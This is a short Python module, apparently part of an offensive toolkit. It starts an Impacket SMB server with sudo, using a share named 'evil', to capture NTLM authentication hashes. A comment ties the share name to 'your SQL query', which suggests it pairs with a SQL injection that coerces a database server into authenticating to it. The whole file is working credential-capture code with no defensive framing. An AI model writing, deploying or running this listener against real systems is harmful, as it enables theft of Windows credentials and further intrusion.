# ntlm/capture.py
import subprocess
import os

def run(data, creds, args):
    log_path = data.get("log_file", "/tmp/ntlm_capture.txt")
    
    # We run a simple SMB server. It captures hashes by default.
    # We name the share 'evil' to match your SQL query.
    cmd = [
        "sudo", "impacket-smbserver", 
        "evil", "/tmp", 
        "-smb2support"
    ]
    
    print(f"[*] Starting Impacket SMBServer on port 445...")
    
    log_file = open(log_path, "w")
    
    # Start it in the background
    proc = subprocess.Popen(
        cmd,
        stdout=log_file,
        stderr=log_file,
        preexec_fn=os.setsid
    )
    return proc